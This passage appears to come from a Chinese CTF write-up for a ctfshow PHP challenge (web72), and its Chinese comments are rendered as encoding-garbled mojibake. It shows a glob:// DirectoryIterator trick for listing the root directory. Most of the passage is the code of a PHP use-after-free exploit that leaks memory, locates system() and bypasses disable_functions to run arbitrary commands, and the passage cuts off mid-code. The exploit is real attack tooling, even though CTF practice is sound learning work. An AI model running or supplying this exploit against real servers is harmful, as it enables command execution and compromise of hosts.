important">?></span></span></code></pre><p>ä»”ç»†çœ‹çœ‹è¿™ä¸ªä»£ç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment"># åˆ©ç”¨DirectoryIterator($path)å¯ä»¥å®ç°éå†ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</span><span class="token comment"># glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span><span class="token comment"># DirectoryIterator("glob:///*")   éå†æ ¹ç›®å½•é‡Œæ‰€æœ‰æ–‡ä»¶</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span>  <span class="token comment">#å¾ªç¯éå†è¾“å‡ºï¼Œå¹¶ä»¥ç©ºæ ¼ä¸ºåˆ†éš”</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>å…¶å®ä¸åŠ å‰é¢<code>?&gt;&lt;?php</code>ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚evalé‡Œçš„è¯­å¥å¯ä»¥è§†ä¸ºåœ¨å½“å‰phpæ–‡ä»¶é‡ŒåŠ äº†å‡ æ¡è¯­å¥ï¼Œè¿™äº›è¯­å¥å¿…é¡»æ˜¯å®Œæ•´çš„ï¼Œå³å¿…é¡»ä»¥<code>;</code>æˆ–è€…<code>?&gt;</code>ç»“å°¾æ¥ç»“æŸè¯­å¥ï¼Œä½†æ˜¯evalé‡Œçš„?&gt;ä¸ä¼šé—­åˆå½“å‰çš„phpæ–‡ä»¶ï¼Œæ‰€ä»¥å½“å‰phpé¡µé¢åç»­çš„è¯­å¥éƒ½æ˜¯ä¼šæ‰§è¡Œçš„ã€‚</p><p>å¯ä»¥çœ‹ä¸€ä¸‹ä¸‹é¢çš„å›¾ç‰‡ï¼Œevalé‡Œçš„è¯­å¥å¯ä»¥ä¿®æ”¹æ–‡ä»¶çš„å˜é‡å€¼ï¼Œä½†æ˜¯<code>?&gt;</code>å¹¶ä¸ä¼šé—­åˆå¤–é¢çš„PHPè¯­å¥ã€‚<br><img src="web72.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">function</span> <span class="token function-definition function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Vuln</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">global</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span>         <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">getTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$backtrace</span> <span class="token operator">=</span> <span class="token function">debug_backtrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Helper</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">str2ptr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$address</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$address</span> <span class="token operator">&lt;&lt;</span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token variable">$address</span> <span class="token operator">|=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span><span class="token operator">+</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$address</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">ptr2str</span><span class="token punctuation">(</span><span class="token variable">$ptr</span><span class="token punctuation">,</span> <span class="token variable">$m</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$out</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$m</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$out</span> <span class="token operator">.=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$ptr</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ptr</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$out</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">,</span> <span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token variable">$n</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$p</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%c"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$v</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$v</span> <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token variable">$p</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">!=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$leak</span> <span class="token operator">%=</span> <span class="token number">2</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span><span class="token variable">$s</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$leak</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$e_type</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phoff</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phentsize</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$e_phnum</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$e_phnum</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$e_phoff</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token variable">$e_phentsize</span><span class="token punctuation">;</span>        <span class="token variable">$p_type</span>  <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_flags</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_vaddr</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$p_memsz</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token variable">$data_addr</span> <span class="token operator">=</span> <span class="token variable">$e_type</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">?</span> <span class="token variable">$p_vaddr</span> <span class="token punctuation">:</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$p_vaddr</span><span class="token punctuation">;</span>            <span class="token variable">$data_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$p_type</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$p_flags</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token variable">$text_size</span> <span class="token operator">=</span> <span class="token variable">$p_memsz</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data_addr</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$text_size</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token variable">$data_size</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$text_size</span><span class="token punctuation">,</span> <span class="token variable">$data_size</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$elf</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$data_size</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x746e6174736e6f63</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$data_addr</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$leak</span> <span class="token operator">-</span> <span class="token variable">$base</span> <span class="token operator">&lt;</span> <span class="token variable">$data_addr</span> <span class="token operator">-</span> <span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>        <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$addr</span> <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$vuln</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span 